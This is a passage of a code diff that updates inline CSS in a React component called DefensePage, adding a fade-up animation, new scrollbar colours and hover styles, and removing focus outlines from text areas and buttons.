+        @keyframes fadeup {
+          from {
+            opacity: 0;
+            transform: translateY(4px);
+          }
+          to {
+            opacity: 1;
+            transform: translateY(0);
           }
         }
         ::-webkit-scrollbar {
@@ -2324,11 +2651,17 @@ export default function DefensePage() {
           background: transparent;
         }
         ::-webkit-scrollbar-thumb {
-          background: rgba(255, 255, 255, 0.1);
+          background: #2a2a30;
           border-radius: 4px;
         }
-        textarea {
-          font-family: "JetBrains Mono", monospace !important;
+        ::-webkit-scrollbar-thumb:hover {
+          background: #3a3a42;
+        }
+        textarea:focus {
+          outline: none;
+        }
+        button:focus {
+          outline: none;
         }
       `}</style>
     </div>
